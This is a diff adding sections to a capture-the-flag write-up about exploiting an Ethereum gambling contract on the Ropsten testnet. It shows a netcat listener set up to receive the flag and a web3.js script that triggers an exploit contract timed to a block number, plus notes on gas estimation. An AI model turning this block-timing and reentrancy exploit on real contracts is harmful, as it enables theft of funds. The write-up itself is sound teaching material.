@@ -140,6 +140,62 @@ the gambling game by continously falling back to our fallback-function
 `function()` to ultimately stop, and call `getFlag`. After the transaction is
 confirmed, our netcat server was answered with the flag.
 
+### Setting up the netcat server
+We also need a TCP server listening somewhere from a public IP.
+That part was super simple, we just run:
+```
+$ nc -lk 8080
+```
+in a machine with a public IP and left it there, logging.
+
+### Running the exploit
+After deploying the smart contract containing the exploit in the Ropsten network, we wrote a script in nodejs to trigger the execution of our exploit.
+
+The script is in JavaScript and run on nodejs. It uses the [web3.js](https://web3js.readthedocs.io/) library:
+```
+(async function pwn() {
+  var privateKey = "...";
+  var publicKey = "...";
+  var wallet = new SimpleWallet(
+    privateKey,
+    publicKey,
+    'https://ropsten.infura.io');
+
+  var contract = await wallet.loadContract('EnterAgain');
+  var blockNumber = await wallet.web3.eth.getBlockNumber();
+  console.log(blockNumber, blockNumber % 7);
+  if (blockNumber % 7 !== 6) {
+    return;
+  }
+  await wallet.send(contract.methods.enter());
+})();
+```
+
+After initializing a provider, we load the `EnterAgain` contract that we compiled on our machine, and ask for the current block number modulo `7` is `6`. Note that the only way win in the `gamble` method is when `blockNumber % 7 === 0`. When the EVM runs the smart contract, `blockNumber` evaluates to the block number that is currently being created. To run our exploit at a specific `blockNumber`, we can try to send the transaction at `blockNumber - 1`, and hope that the transaction will be included in the next block.
+
+#### A note on `estimateGas`
+We developed the exploit using a local `ganache-cli` node for testing.
+We spent several hours figuring out why our transaction failed, even if the logic was correct. It seems that `ganache-cli` doesn't give you a clear message if your transaction runs out of gas. After moving to Ropsten, we got a clear message: "gas required exceeds allowance or always failing transaction".
+
+Note that we used as `gasLimit` the result of `estimateGas`. After the error on Ropsted, we decided to hardcode a large amount of gas (900000) and the transaction went through successfully.
+
+```
+    const rawTx = {
+      from: this.address,
+      to: method._parent.options.address,
+      nonce: this.web3.utils.toHex(count),
+      gasPrice: this.web3.utils.toHex(this.web3.utils.toWei("21", "gwei")),
+      gasLimit: this.web3.utils.toHex(
+        //await method.estimateGas({from: this.address}),
+        900000
+      ),
+      data: data,
+    };
+```
+
+Basically, what `estimateGas` does is to take the transaction, execute it against the current state of the blockchain, measure the amount of gas used and return it. `estimateGas` is basically a dry run of the transaction, and it happens right before submitting the transaction to the network. We send our transaction when `blockNumber % 7 === 6`, so it can be executed when `blockNumber % 7 === 0`. Hence, `estimateGas` ran `gamble` on the wrong `blockNumber` without triggering the exploit, giving us a wrong estimation of the gas needed.
+
+
 ### Installation
 
 ```
